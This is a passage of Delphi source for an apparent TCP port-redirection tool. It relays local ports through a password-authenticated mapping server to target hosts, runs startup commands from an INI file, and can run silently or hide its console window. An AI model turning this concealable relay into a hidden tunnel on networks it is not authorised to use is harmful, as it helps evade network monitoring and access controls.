     if LSign=BSC_AUTHORIZATION_OK then
     begin
      LSign:=BSC_SERVICE_TEST_REQ;
      SendData(@LSign,SizeOf(LSign));
      RecvData(@LSign,SizeOf(LSign));
      Result:=LSign=BSC_SERVICE_TEST_RES;
     end;
    end;
   end;
  end;
  LTCPClient.Free;
 except
  Result:=False;
 end;
end;

procedure NewRedir(AArgs:Pointer);stdcall;
var
 LPMappedPort:PMappedPort;
 LI:Integer;
begin
 LPMappedPort:=AArgs;
 with LPMappedPort^ do
  AddRedir(LocalListenPort,MappingServer,MappingServerPort,@Opened,TargetServer,TargetServerPort,PortType,Pointer(Domain),AuthNum);
 LI:=MappedPorts.IndexOf(LPMappedPort);
 WriteLn('Port number '+IntToStr(LI)+' closed.');
end;

procedure Write(const CStr:string);
begin
 if not SilentNow then System.Write(CStr);
end;

procedure WriteLn(const CStr:string);
begin
 if not SilentNow then System.WriteLn(CStr);
end;

procedure Read(var VStr:string);
begin
 if not SilentNow then System.Read(VStr);
end;

procedure ReadLn(var VStr:string);
begin
 if not SilentNow then System.ReadLn(VStr);
end;

procedure KillMappedPorts;
var
 LPMappedPort:PMappedPort;
 LI:Integer;
begin
 if MappedPorts=nil then Exit;
 for LI:=0 to MappedPorts.Count-1 do
 begin
  LPMappedPort:=MappedPorts[LI];
  Dispose(LPMappedPort);
 end;
 MappedPorts.Clear;
 MappedPorts.Free;
 MappedPorts:=nil;
end;

procedure KillStartupList;
var
 LPStartupItem:PStartupItem;
 LI:Integer;
begin
 if StartupList=nil then Exit;
 for LI:=0 to StartupList.Count-1 do
 begin
  LPStartupItem:=StartupList[LI];
  Dispose(LPStartupItem);
 end;
 StartupList.Clear;
 StartupList.Free;
 StartupList:=nil;
end;

function IniNameFromExe:string;
var
 LBuffer:array[0..MAX_PATH-1] of Char;
 LPB:^Char;
 LRet:Cardinal;
 LStr:string;
begin
 Result:='';
 ZeroMemory(@LBuffer,SizeOf(LBuffer));
 LRet:=GetModuleFileName(0,LBuffer,SizeOf(LBuffer));
 LPB:=@LBuffer[LRet];
 while LRet>0 do
 begin
  if LPB^='.' then Break
  else Dec(LPB);
  Dec(LRet);
 end;
 if LRet=0 then Exit;
 Inc(LPB);
 LPB^:='i';
 Inc(LPB);
 LPB^:='n';
 Inc(LPB);
 LPB^:='i';
 LStr:=LBuffer;
 Result:=ExtractFileName(LStr);
end;

function AuthStrToNum(P:Pointer):Cardinal; stdcall; assembler;
asm
 @auth:
  push edi
  push ebx
  push esi
  mov esi,P
  push esi
  push 03F1h
  pop ebx
  mov eax,0FA230000h
  mov edx,0633AF89Eh
  mov edi,03481A3C1h
 @auth_first:
  pop esi
  push esi
  push 008h
  pop ecx
 @auth_next:
  lodsw
  shl eax,003h
  add eax,edi
  xor edx,eax
  add dh,cl
  setz al
  inc al
  add edi,eax
  loop @auth_next
 @auth_end:
  add edx,edi
  dec ebx
  jnz @auth_first
  mov eax,edx
  pop esi
  pop esi
  pop ebx
  pop edi
end;

function SaveIniFile:Boolean;
var
 LFile:TextFile;
 LI:Integer;
 LStr1,LStr2:string;
 LPMappedPort:PMappedPort;
 LPStartupItem:PStartupItem;
begin
 Result:=False;
 if FileExists(IniFile) then DeleteFile(IniFile);
 if FileExists(IniFile) then Exit;
 AssignFile(LFile,IniFile);
 Rewrite(LFile);
 System.WriteLn(LFile,'[Settings]');
 System.Write(LFile,'SilentMode=');
 if Settings.SilentMode then System.WriteLn(LFile,'True')
 else System.WriteLn(LFile,'False');
 System.WriteLn(LFile);
 System.WriteLn(LFile,'[Startup]');
 for LI:=0 to StartupList.Count-1 do
 begin
  LPStartupItem:=StartupList[LI];
  LStr1:=Trim(LPStartupItem^);
  System.WriteLn(LFile,LStr1);
 end;
 System.WriteLn(LFile);
 System.WriteLn(LFile,'[Mapped ports]');
 for LI:=0 to MappedPorts.Count-1 do
 begin
  LPMappedPort:=MappedPorts[LI];
  with LPMappedPort^ do
  begin
   case PortType of
    ptUnknown:LStr2:='';
    ptNormal:LStr2:='NORMAL';
    ptHTTP:LStr2:='HTTP';
   end;
   LStr1:={ID+':'+}IntToStr(LocalListenPort)+':'+inet_ntoa(MappingServer)+':'+IntToStr(MappingServerPort)+':'+inet_ntoa(TargetServer)+':'+IntToStr(TargetServerPort)+':'+Trim(Password)+':'+LStr2+':'+Domain;
   System.WriteLn(LFile,LStr1);
  end;
 end;
 System.WriteLn(LFile);

 CloseFile(LFile);
 Result:=True;
end;

function LoadIniFile:Boolean;
var
 LFileName,LOrg,LLine,LStr:string;
 LFile:TextFile;
 LFailed:Boolean;
 LAuthPass:array[0..15] of Char;
 LMappedPort:TMappedPort;
 LPMappedPort:PMappedPort;
 LPStartupItem:PStartupItem;
begin
 Result:=False;
 ZeroMemory(@Settings,SizeOf(Settings));
 if ParamCount=1 then IniFile:=ParamStr(1)
 else IniFile:=IniNameFromExe;
 LOrg:=IniFile;
 KillMappedPorts;
 KillStartupList;
 MappedPorts:=TList.Create;
 StartupList:=TList.Create;
 if not FileExists(IniFile) then
 begin
  LFileName:=ExtractFilePath(ParamStr(0));
  AddLastBackslash(LFileName);
  IniFile:=LFileName+ExtractFileName(IniFile);
  if not FileExists(IniFile) then
  begin
   IniFile:=LFileName+LOrg;
   SaveIniFile;
  end;
  if not FileExists(IniFile) then Exit;
 end;
 LFailed:=False;
 AssignFile(LFile,IniFile);
 Reset(LFile);
 while (not EoF(LFile)) and (UpCase(LLine)<>'[SETTINGS]') do System.ReadLn(LFile,LLine);
 if EoF(LFile) then begin CloseFile(LFile); Exit; end;
 while not EoF(LFile) do
 begin
  System.ReadLn(LFile,LLine);
  LLine:=Trim(LLine);
  if Length(LLine)=0 then Break;

  if Pos('SILENTMODE',UpCase(LLine))=1 then Settings.SilentMode:=Pos('TRUE',UpCase(LLine))>0;
 end;
 CloseFile(LFile);
 if WindowsType<>wtNT then Settings.SilentMode:=False;
 SilentNow:=Settings.SilentMode;

 AssignFile(LFile,IniFile);
 Reset(LFile);
 while (not EoF(LFile)) and (UpCase(LLine)<>'[STARTUP]') do System.ReadLn(LFile,LLine);
 if EoF(LFile) then begin CloseFile(LFile); Exit; end;
 while not EoF(LFile) do
 begin
  System.ReadLn(LFile,LLine);
  LLine:=Trim(LLine);
  if Length(LLine)=0 then Break;
  if Length(LLine)>=SizeOf(TStartupItem) then SetLength(LLine,SizeOf(TStartupItem)-1);
  New(LPStartupItem);
  ZeroMemory(LPStartupItem,SizeOf(TStartupItem));
  CopyMemory(LPStartupItem,Pointer(LLine),Length(LLine));
  StartupList.Add(LPStartupItem);
 end;
 CloseFile(LFile);

 Reset(LFile);
 while (not EoF(LFile)) and (UpCase(LLine)<>'[MAPPED PORTS]') do System.ReadLn(LFile,LLine);
 if EoF(LFile) then begin CloseFile(LFile); Exit; end;
 while not EoF(LFile) do
 with LMappedPort do
 begin
  ZeroMemory(@LMappedPort,SizeOf(LMappedPort));
  System.ReadLn(LFile,LLine);
  LLine:=Trim(LLine);
  if Length(LLine)=0 then Break;
{  LStr:=Copy(LLine,1,Pos(':',LLine)-1);
  LLine:=Copy(LLine,Pos(':',LLine)+1,MaxInt);
  SetLength(LStr,4);
  CopyMemory(@ID,Pointer(LStr),4);}
  LStr:=Copy(LLine,1,Pos(':',LLine)-1);
  LLine:=Copy(LLine,Pos(':',LLine)+1,MaxInt);
  LocalListenPort:=StrToIntDef(LStr);
  LStr:=Copy(LLine,1,Pos(':',LLine)-1);
  LLine:=Copy(LLine,Pos(':',LLine)+1,MaxInt);
  MappingServer.S_addr:=inet_addr(PChar(LStr));
  LStr:=Copy(LLine,1,Pos(':',LLine)-1);
  LLine:=Copy(LLine,Pos(':',LLine)+1,MaxInt);
  MappingServerPort:=StrToIntDef(LStr);
  LStr:=Copy(LLine,1,Pos(':',LLine)-1);
  LLine:=Copy(LLine,Pos(':',LLine)+1,MaxInt);
  TargetServer.S_addr:=inet_addr(PChar(LStr));
  LStr:=Copy(LLine,1,Pos(':',LLine)-1);
  LLine:=Copy(LLine,Pos(':',LLine)+1,MaxInt);
  TargetServerPort:=StrToIntDef(LStr);
  LStr:=Copy(LLine,1,Pos(':',LLine)-1);
  LLine:=Copy(LLine,Pos(':',LLine)+1,MaxInt);
  FillChar(LAuthPass,SizeOf(LAuthPass),$20);
  if Length(LStr)>16 then SetLength(LStr,16);
  CopyMemory(@LAuthPass,Pointer(LStr),Length(LStr));
  CopyMemory(@Password,@LAuthPass,SizeOf(Password));
  AuthNum:=AuthStrToNum(@LAuthPass);
  LStr:=Copy(LLine,1,Pos(':',LLine)-1);
  LLine:=Copy(LLine,Pos(':',LLine)+1,MaxInt);
  if UpCase(LStr)='NORMAL' then PortType:=ptNormal
  else if UpCase(LStr)='HTTP' then PortType:=ptHTTP
  else PortType:=ptUnknown;
  LStr:=LLine;
  if PortType=ptHTTP then Domain:=Trim(LStr)
  else Domain:='';

  LFailed:=(LocalListenPort=0) or (MappingServerPort=0) or (TargetServerPort=0)
        or (MappingServer.S_addr=INADDR_NONE) or (TargetServer.S_addr=INADDR_NONE) or (PortType=ptUnknown);
  if LFailed then Break;
  Opened:=False;
  New(LPMappedPort);
  LPMappedPort^:=LMappedPort;
  MappedPorts.Add(LPMappedPort);
 end;
 CloseFile(LFile);
 Result:=not LFailed;
end;

procedure HideConsole;
begin
 WriteLn('');
 if ReadThreadExists then ReadThreadSuspened:=SuspendThread(ReadThreadHandle)<>$FFFFFFFF;
 ReadConsoleOutput(OutputHandle,@ConsoleScreenBuffer,FirstCoords,SecondCoords,FirstRect);
 GetConsoleCursorInfo(OutputHandle,ConsoleCursorInfo);
 GetConsoleScreenBufferInfo(OutputHandle,ConsoleScreenBufferInfo);
 IsConsole:=not FreeConsole;
end;

procedure ShowConsole;
begin
 if not SilentNow then IsConsole:=AllocConsole
 else IsConsole:=True;
 if not IsConsole then Exit;
 WriteLn('');
 InputHandle:=GetStdHandle(STD_INPUT_HANDLE);
 OutputHandle:=GetStdHandle(STD_OUTPUT_HANDLE);
 SetConsoleScreenBufferSize(OutputHandle,FirstCoords);
 WriteConsoleOutput(OutputHandle,@ConsoleScreenBuffer,FirstCoords,SecondCoords,FirstRect);
 SetConsoleCursorInfo(OutputHandle,ConsoleCursorInfo);
 SetConsoleCursorPosition(OutputHandle,ConsoleScreenBufferInfo.dwCursorPosition);
 if ReadThreadExists then ResumeThread(ReadThreadHandle);
end;

procedure OpenMappedPort(AIndex:Integer);
var
 LPMappedPort:PMappedPort;
 LTID:Cardinal;
 LI:Integer;
begin
 if AIndex=-1 then
 begin
  for LI:=0 to MappedPorts.Count-1 do
  begin
   LPMappedPort:=MappedPorts[LI];
   if not LPMappedPort^.Opened then
   begin
    LPMappedPort^.Opened:=True;
    CreateThread(nil,0,@NewRedir,LPMappedPort,0,LTID);
    WaitPoint(500);
    if LPMAppedPort^.Opened then WriteLn('Port number '+IntToStr(LI)+' opened.');
   end;
  end;
 end else
 begin
  LPMappedPort:=MappedPorts[AIndex];
  LPMappedPort^.Opened:=True;
  CreateThread(nil,0,@NewRedir,LPMappedPort,0,LTID);
  WaitPoint(500);
  if LPMAppedPort^.Opened then WriteLn('Port number '+IntToStr(AIndex)+' opened.');
 end;
end;

procedure CloseMappedPort(AIndex:Integer);
var
 LPMappedPort:PMappedPort;
 LI:Integer;
begin
 if AIndex=-1 then
 begin
  for LI:=0 to MappedPorts.Count-1 do
  begin
   LPMappedPort:=MappedPorts[LI];
   if LPMappedPort^.Opened then
   begin
    LPMappedPort^.Opened:=False;
    WaitPoint(250);
   end;
  end;
  WaitPoint(250);
 end else
 begin
  LPMappedPort:=MappedPorts[AIndex];
  LPMappedPort^.Opened:=False;
  WaitPoint(500);
 end;
end;

function MappedPortsListAdd(AArgs:string;var VMappedPort:TMappedPort):Boolean;
var
 LStr1:string;
 LAuthPass:array[0..15] of Char;
begin
 Result:=False;
 with VMappedPort do
 begin
  if Length(AArgs)=0 then
  begin
   Write('Local port: ');
   ReadLn(LStr1);
   LocalListenPort:=StrToIntDef(LStr1);
   if LocalListenPort>0 then
   begin
    Write('Mapping server: ');
    ReadLn(LStr1);
    MappingServer.S_addr:=inet_addr(PChar(LStr1));
    if MappingServer.S_addr<>INADDR_NONE then
    begin
     Write('Mapping server port: ');
     ReadLn(LStr1);
     MappingServerPort:=StrToIntDef(LStr1);
     if MappingServerPort>0 then
     begin
      Write('Target server: ');
      ReadLn(LStr1);
      TargetServer.S_addr:=inet_addr(PChar(LStr1));
      if TargetServer.S_addr<>INADDR_NONE then
      begin
       Write('Target server port: ');
       ReadLn(LStr1);
       TargetServerPort:=StrToIntDef(LStr1);
       if TargetServerPort>0 then
       begin
        Write('Password: ');
        ReadLn(LStr1);
        if Length(Trim(LStr1))>0 then
        begin
         FillChar(LAuthPass,SizeOf(LAuthPass),$20);
         if Length(LStr1)>16 then SetLength(LStr1,16);
         CopyMemory(@LAuthPass,Pointer(LStr1),Length(LStr1));
         CopyMemory(@Password,@LAuthPass,SizeOf(Password));
         AuthNum:=AuthStrToNum(@LAuthPass);
         Write('Type (press enter for NORMAL type): ');
         ReadLn(LStr1);
         LStr1:=UpCase(LStr1);
         if Length(Trim(LStr1))=0 then PortType:=ptNormal
         else if LStr1='NORMAL' then PortType:=ptNormal
         else if LStr1='HTTP' then PortType:=ptHTTP
         else PortType:=ptUnknown;
         case PortType of
          ptUnknown:WriteLn('Unknown port type');
          ptHTTP:begin
           Write('Domain: ');
           ReadLn(LStr1);
           Domain:=LStr1;
          end;
          else ;
         end;
         Result:=not (PortType=ptUnknown);
        end else WriteLn('Password can''t be empty.');
       end else WriteLn('Port value must be 1 - 65535.');
      end else WriteLn('Server address must be IP in A.B.C.D format.');
     end else WriteLn('Port value must be 1 - 65535.');
    end else WriteLn('Server address must be IP in A.B.C.D format.');
   end else WriteLn('Port value must be 1 - 65535.');
  end else
  begin
   AArgs:=AArgs+'   ';
   LStr1:=Copy(AArgs,1,Pos(' ',AArgs)-1);
   AArgs:=Copy(AArgs,Pos(' ',AArgs)+1,MaxInt);
   LocalListenPort:=StrToIntDef(LStr1);
   LStr1:=Copy(AArgs,1,Pos(' ',AArgs)-1);
   AArgs:=Copy(AArgs,Pos(' ',AArgs)+1,MaxInt);
   MappingServer.S_addr:=inet_addr(PChar(LStr1));
   LStr1:=Copy(AArgs,1,Pos(' ',AArgs)-1);
   AArgs:=Copy(AArgs,Pos(' ',AArgs)+1,MaxInt);
   MappingServerPort:=StrToIntDef(LStr1);
   LStr1:=Copy(AArgs,1,Pos(' ',AArgs)-1);
   AArgs:=Copy(AArgs,Pos(' ',AArgs)+1,MaxInt);
   TargetServer.S_addr:=inet_addr(PChar(LStr1));
   LStr1:=Copy(AArgs,1,Pos(' ',AArgs)-1);
   AArgs:=Copy(AArgs,Pos(' ',AArgs)+1,MaxInt);
   TargetServerPort:=StrToIntDef(LStr1);
   LStr1:=Copy(AArgs,1,Pos(' ',AArgs)-1);
   AArgs:=Copy(AArgs,Pos(' ',AArgs)+1,MaxInt);
   FillChar(LAuthPass,SizeOf(LAuthPass),$20);
   if Length(LStr1)>16 then SetLength(LStr1,16);
   CopyMemory(@LAuthPass,Pointer(LStr1),Length(LStr1));
   CopyMemory(@Password,@LAuthPass,SizeOf(Password));
   AuthNum:=AuthStrToNum(@LAuthPass);
   LStr1:=Copy(AArgs,1,Pos(' ',AArgs)-1);
   AArgs:=Copy(AArgs,Pos(' ',AArgs)+1,MaxInt);
   if Length(LStr1)=0 then
   begin
    PortType:=ptNormal;
    Domain:='';
   end else
   begin
    if UpCase(LStr1)='NORMAL' then PortType:=ptNormal
    else if UpCase(LStr1)='HTTP' then PortType:=ptHTTP
    else PortType:=ptUnknown;
    LStr1:=AArgs;
    if PortType=ptHTTP then Domain:=Trim(LStr1)
    else Domain:='';
   end;
   Result:=not ((LocalListenPort=0) or (MappingServerPort=0) or (TargetServerPort=0)
          or (MappingServer.S_addr=INADDR_NONE) or (TargetServer.S_addr=INADDR_NONE)
          or (PortType=ptUnknown));
   if not Result then WriteLn('invalid or missing argument(s)');
  end;
 end;
end;

function FindCommandIndex(ACommand:string):Integer;
var
 LI:Integer;
begin
 Result:=0;
 ACommand:=UpCase(ACommand);
 for LI:=1 to CommandsCount do
  if ACommand=CommandList[LI].Name then
  begin
   Result:=LI;
   Break;
  end;
end;

procedure ProcessInput(ACommand:string);
var
 LCommand,LArgs,LStr1,LStr2:string;
 LIndex,LNum,LMin,LMax:Integer;
 LMappedPort:TMappedPort;
 LFailed:Boolean;
 LPMappedPort:PMappedPort;
 LPStartupItem:PStartupItem;
begin
 LCommand:=Trim(ACommand)+' ';
 LArgs:=Trim(Copy(LCommand,Pos(' ',LCommand)+1,MaxInt));
 LCommand:=Copy(LCommand,1,Pos(' ',LCommand)-1);
 LCommand:=UpCase(LCommand);
 if Length(LCommand)=0 then Exit;
 LIndex:=FindCommandIndex(LCommand);
 case LIndex of
  0:WriteLn('Unknown command. Type HELP for command list.');
  1:begin
   if Length(LArgs)=0 then
   begin
    WriteLn('Type HELP COMMAND for command details.');
    WriteLn('Valid commands are:');
    for LIndex:=1 to 12 do Write(CommandList[LIndex].Name+', ');
    WriteLn('');
    for LIndex:=13 to CommandsCount-1 do Write(CommandList[LIndex].Name+', ');
    WriteLn(CommandList[CommandsCount].Name);
   end else
   begin
    LArgs:=UpCase(LArgs);
    LIndex:=FindCommandIndex(LArgs);
    if LIndex<>0 then
    begin
     WriteLn(CommandList[LIndex].Info);
     WriteLn('usage: '+CommandList[LIndex].Name+CommandList[LIndex].Usage);
    end else WriteLn('Unknown command. Type HELP for command list.');
   end;
  end;
  2:begin
   LArgs:=UpCase(LArgs);
   if LArgs<>'DIS' then SaveIniFile;
   PostMessage(WindowHandle,WM_TRAY_END,0,0);
  end;
  3:begin
   ZeroMemory(@ConsoleScreenBuffer,SizeOf(ConsoleScreenBuffer));
   WriteConsoleOutput(OutputHandle,@ConsoleScreenBuffer,FirstCoords,SecondCoords,FirstRect);
   ConsoleScreenBufferInfo.dwCursorPosition:=SecondCoords;
   SetConsoleCursorPosition(OutputHandle,ConsoleScreenBufferInfo.dwCursorPosition);
  end;
  4:if SaveIniFile then WriteLn('Saved successfully.')
    else WriteLn('Unable to save.');
  5:if MappedPorts.Count>0 then
  begin
   LNum:=StrToIntDef(LArgs);
   if LNum<1 then LNum:=MappedPorts.Count
   else LNum:=LNum*24;
   LMin:=LNum-24;
   if LMin<0 then LMin:=0;
   LMax:=LNum-1;
   if LMax>=MappedPorts.Count then LMax:=MappedPorts.Count-1;
   if LMin<=LMax then
   begin
    for LIndex:=LMin to LMax do
    begin
     LPMappedPort:=MappedPorts[LIndex];
     with LPMappedPort^ do
     begin
      case PortType of
       ptUnknown:LStr2:='';
       ptNormal:LStr2:='NORMAL';
       ptHTTP:LStr2:='HTTP';
      end;
      LStr1:=IntToStrLen(LIndex,3)+') :'+IntToStr(LocalListenPort)+':'+inet_ntoa(MappingServer)+':'+IntToStr(MappingServerPort)+':'+inet_ntoa(TargetServer)+':'+IntToStr(TargetServerPort)+':'+Trim(Password)+':'+LStr2;
      if Opened then LStr1[5]:='*';
      WriteLn(LStr1);
     end;
    end;
   end else WriteLn('Only '+IntToStr(MappedPorts.Count div 24+1)+' page(s) available.');
  end else WriteLn('No mapped ports in the list.');
  6:if Length(LArgs)>0 then
  begin
   if MappedPorts.Count>0 then
   begin
    if UpCase(LArgs)='ALL' then OpenMappedPort(-1)
    else begin
     LIndex:=StrToIntDef(LArgs,-1);
     if (LIndex>=0) and (LIndex<MappedPorts.Count) then
     begin
      LPMappedPort:=MappedPorts[LIndex];
      if not LPMappedPort^.Opened then OpenMappedPort(LIndex)
      else WriteLn('Port is not closed.');
     end else WriteLn('Only 0 - '+IntToStr(MappedPorts.Count-1)+' port index(es) available.');
    end;
   end else WriteLn('No mapped ports in the list.');
  end else WriteLn('missing argument');
  7:if Length(LArgs)>0 then
  begin
   if MappedPorts.Count>0 then
   begin
    if UpCase(LArgs)='ALL' then CloseMappedPort(-1)
    else begin
     LIndex:=StrToIntDef(LArgs,-1);
     if (LIndex>=0) and (LIndex<MappedPorts.Count) then
     begin
      LPMappedPort:=MappedPorts[LIndex];
      if LPMappedPort^.Opened then CloseMappedPort(LIndex)
      else WriteLn('Port is not opened.');
     end else WriteLn('Only 0 - '+IntToStr(MappedPorts.Count-1)+' port index(es) available.');
    end;
   end else WriteLn('No mapped ports in the list.');
  end else WriteLn('missing argument');
  8:begin
   if WindowsType=wtNT then
   begin
    Write('Hiding console ...');
    PostMessage(WindowHandle,WM_HIDECONSOLE,0,0);
   end else WriteLn('This feature works only on NT boxes.'); 
  end;
  9:if MappedPorts.Count>0 then
  begin
   Write('There are '+IntToStr(MappedPorts.Count)+' mapped ports in the list. Currently ');
   LNum:=0;
   for LIndex:=0 to MappedPorts.Count-1 do
   begin
    LPMappedPort:=MappedPorts[LIndex];
    if LPMappedPort^.Opened then Inc(LNum);
   end;
   WriteLn(IntToStr(LNum)+' of them open.');
  end else WriteLn('No mapped ports in the list.');
  10:with LMappedPort do
  if MappedPorts.Count<MaxMappedPorts then
  begin
   LFailed:=not MappedPortsListAdd(LArgs,LMappedPort);
   if not LFailed then
   begin
    New(LPMappedPort);
    LPMappedPort^:=LMappedPort;
    MappedPorts.Add(LPMappedPort);
   end;
  end else WriteLn('You can''t use more than '+IntToStr(MaxMappedPorts)+' ports.');
  11:if Length(LArgs)>0 then
  begin
   if MappedPorts.Count>0 then
   begin
    LIndex:=StrToIntDef(LArgs,-1);
    if (LIndex>=0) and (LIndex<MappedPorts.Count) then
    begin
     LPMappedPort:=MappedPorts[LIndex];
     if not LPMappedPort^.Opened then
     begin
      Dispose(LPMappedPort);
      MappedPorts.Delete(LIndex);
     end else WriteLn('You can''t delete opened port.');
    end else WriteLn('Only 0 - '+IntToStr(MappedPorts.Count-1)+' port index(es) available.');
   end else WriteLn('No mapped ports in the list.');
  end else WriteLn('missing argument');
  12:if Length(LArgs)>0 then
  begin
   if MappedPorts.Count>0 then
   begin
    LIndex:=StrToIntDef(LArgs,-1);
    if (LIndex>=0) and (LIndex<MappedPorts.Count) then
    begin
     LPMappedPort:=MappedPorts[LIndex];
     with LPMappedPort^ do
     begin
      WriteLn('Listening on port: '+IntToStr(LocalListenPort));
      WriteLn('Mapping server address: '+inet_ntoa(MappingServer));
      WriteLn('Mapping server port: '+IntToStr(MappingServerPort));
      WriteLn('Target server address: '+inet_ntoa(TargetServer));
      WriteLn('Target server port: '+IntToStr(TargetServerPort));
      WriteLn('Password: '+Trim(Password));
      Write('Port type: ');
      case PortType of
       ptNormal:WriteLn('NORMAL');
       ptHTTP:begin
        WriteLn('HTTP');
        WriteLn('Domain name for HTTP Host: '+Domain);
       end;
       else WriteLn('Unknown');
      end;
      Write('Current state: ');
      if Opened then WriteLn('OPENED')
      else WriteLn('CLOSED');
     end;
    end else WriteLn('Only 0 - '+IntToStr(MappedPorts.Count-1)+' port index(es) available.');
   end else WriteLn('No mapped ports in the list.');
  end else WriteLn('missing argument');
  13:if StartupList.Count>0 then
  begin
   LNum:=StrToIntDef(LArgs);
   if LNum<1 then LNum:=StartupList.Count
   else LNum:=LNum*24;
   LMin:=LNum-24;
   if LMin<0 then LMin:=0;
   LMax:=LNum-1;
   if LMax>=StartupList.Count then LMax:=StartupList.Count-1;
   if LMin<=LMax then
   begin
    for LIndex:=LMin to LMax do
    begin
     LPStartupItem:=StartupList[LIndex];
     LStr1:=Trim(LPStartupItem^);
     WriteLn(IntToStr(LIndex)+') '+LStr1);
    end;
   end else WriteLn('Only '+IntToStr(MappedPorts.Count div 24+1)+' page(s) available.');
  end else WriteLn('No startup commands in the list.');
  14:if Length(LArgs)>0 then
  begin
   New(LPStartupItem);
   ZeroMemory(LPStartupItem,SizeOf(TStartupItem));
   CopyMemory(LPStartupItem,Pointer(LArgs),Length(LArgs));
   StartupList.Add(LPStartupItem);
  end else WriteLn('missing argument');
  15:if Length(LArgs)>0 then
  begin
   if StartupList.Count>0 then
   begin
    LIndex:=StrToIntDef(LArgs,-1);
    if (LIndex>=0) and (LIndex<StartupList.Count) then
    begin
     LPStartupItem:=StartupList[LIndex];
     Dispose(LPStartupItem);
     StartupList.Delete(LIndex);
    end else WriteLn('Only 0 - '+IntToStr(StartupList.Count-1)+' startup command index(es) available.');
   end else WriteLn('No startup commands in the list.');
  end else WriteLn('missing argument');
  16:if Length(LArgs)=0 then
  begin
   Write('Silent mode is ');
   if Settings.SilentMode then WriteLn('enabled')
   else WriteLn('disabled');
  end else
  begin
   LArgs:=UpCase(LArgs);
   if LArgs='ON' then Settings.SilentMode:=True
   else if LArgs='OFF' then Settings.SilentMode:=False;
   Write('Silent mode is ');
   if Settings.SilentMode then WriteLn('enabled')
   else WriteLn('disabled');
  end;
  17:if Length(LArgs)>0 then
  begin;
   if MappedPorts.Count>0 then
   begin
    LIndex:=StrToIntDef(LArgs,-1);
    if (LIndex>=0) and (LIndex<MappedPorts.Count) then
    begin
     LPMappedPort:=MappedPorts[LIndex];
     if not LPMappedPort^.Opened then
     begin
      if MappedPortsListAdd('',LMappedPort) then LPMappedPort^:=LMappedPort;
     end else WriteLn('You can''t change opened port.'); 
    end else WriteLn('Only 0 - '+IntToStr(MappedPorts.Count-1)+' port index(es) available.');
   end else WriteLn('No mapped ports in the list.');
  end else WriteLn('missing argument');
  18:if Length(LArgs)>0 then
  begin;
   if StartupList.Count>0 then
   begin
    LIndex:=StrToIntDef(LArgs,-1);
    if (LIndex>=0) and (LIndex<StartupList.Count) then
    begin
     LPStartupItem:=StartupList[LIndex];
     Write('New value: ');
     ReadLn(LStr1);
     LStr1:=Trim(LStr1);
     if Length(LStr1)>0 then
     begin
      if Length(LStr1)>=SizeOf(TStartupItem) then SetLength(LStr1,SizeOf(TStartupItem)-1);
      ZeroMemory(LPStartupItem,SizeOf(TStartupItem));
      CopyMemory(LPStartupItem,Pointer(LStr1),Length(LStr1));
     end else WriteLn('This value is invalid.');
    end else WriteLn('Only 0 - '+IntToStr(StartupList.Count-1)+' startup command index(es) available.');
   end else WriteLn('No startup commands in the list.');
  end else WriteLn('missing argument');
  19:if Length(LArgs)>0 then
  begin
   if MappedPorts.Count>0 then
   begin
    if UpCase(LArgs)='ALL' then
    begin
     for LIndex:=0 to MappedPorts.Count-1 do
     begin
      LPMappedPort:=MappedPorts[LIndex];
      with LPMappedPort^ do
      begin
       Write('Testing '+IntToStr(LIndex)+') '+inet_ntoa(MappingServer)+':'+IntToStr(MappingServerPort)+':'+Trim(Password)+' - ');
       if TestMappingServer(MappingServer,MappingServerPort,AuthNum) then WriteLn('OK')
       else WriteLn('FAILED');
      end; 
     end;
    end else
    begin
     LIndex:=StrToIntDef(LArgs,-1);
     if (LIndex>=0) and (LIndex<MappedPorts.Count) then
     begin
      LPMappedPort:=MappedPorts[LIndex];
      with LPMappedPort^ do
      begin
       Write('Testing '+IntToStr(LIndex)+') '+inet_ntoa(MappingServer)+':'+IntToStr(MappingServerPort)+':'+Trim(Password)+' - ');
       if TestMappingServer(MappingServer,MappingServerPort,AuthNum) then WriteLn('OK')
       else WriteLn('FAILED');
      end;
     end else WriteLn('Only 0 - '+IntToStr(MappedPorts.Count-1)+' port index(es) available.');
    end;
   end else WriteLn('No mapped ports in the list.');
  end else WriteLn('missing argument');
 end;
end;

procedure ReadConsoleCommands(AArgs:Pointer); stdcall;
var
 LCommand:string;
begin
 ReadThreadExists:=True;
 while AppRun do
 begin
  Write('>');
  ReadThreadSuspened:=False;
  ReadLn(LCommand);
  ProcessInput(LCommand);
 end;
end;

procedure DoubleClick;
begin
 if IsConsole then
 begin
  WriteLn('');
  Write('Hiding console ...');
  HideConsole;
 end else ShowConsole;
end;

function WindowProc(AHwnd:THandle;AMsg:Cardinal;AwParam:WPARAM;AlParam:LPARAM):Cardinal;stdcall; 
begin
 Result:=1;
 case AMsg of
  WM_QUIT:PostMessage(WindowHandle,WM_TRAY_END,0,0);
  WM_TRAYNOTIFY:case AlParam of
   WM_LBUTTONDBLCLK:DoubleClick;
  end;
  WM_HIDECONSOLE:HideConsole;
  else Result:=DefWindowProc(AHwnd,AMsg,AwParam,AlParam);
 end;
end;

function CreateWin:Boolean;
begin
 Result:=False;
 with WindowClass do
 begin
  style:=0;
  lpfnWndProc:=@WindowProc;
  cbClsExtra:=0;
  cbWndExtra:=0;
  hInstance:=SysInit.HInstance;
  hIcon:=0;
  hCursor:=0;
  hbrBackground:=0;
  lpszMenuName:=nil;
  lpszClassName:=WindowClassName;
 end;
 if Windows.RegisterClass(WindowClass)=0 then Exit;
 if (FindWindow(WindowClass.lpszClassName,'')<>0) then Exit;
 WindowHandle:=CreateWindow(WindowClassName,nil,0,-100,-100,0,0,0,0,0,nil);
 Result:=WindowHandle<>0;
end;

procedure DestroyWin;
begin
 AppRun:=False;
 if IsConsole then HideConsole;
 DestroyWindow(WindowHandle);
 UnRegisterClass(WindowClassName,SysInit.HInstance);
 Shell_NotifyIcon(NIM_DELETE,@NotifyIconData);
end;

procedure CreateMappedPorts;
var
 LTID:Cardinal;
 LPStartupItem:PStartupItem;
 LLine:string;
 LI:Integer;
begin
 ShowConsole;
 if not IniLoaded then
 begin
  WriteLn('Corrupted inifile! Delete it or fix it and than restart this application.');
  Sleep(2000);
  PostMessage(WindowHandle,WM_TRAY_END,0,0);
  Exit;
 end;
 WriteLn('Processing startup...');
 for LI:=0 to StartupList.Count-1 do
 begin
  LPStartupItem:=StartupList[LI];
  LLine:=LPStartupItem^;
  ProcessInput(LLine);
 end;
 ReadThreadHandle:=CreateThread(nil,0,@ReadConsoleCommands,nil,0,LTID);
end;

procedure AppEnd;
begin
 DestroyWin;
 KillMappedPorts;
 KillStartupList;
end;

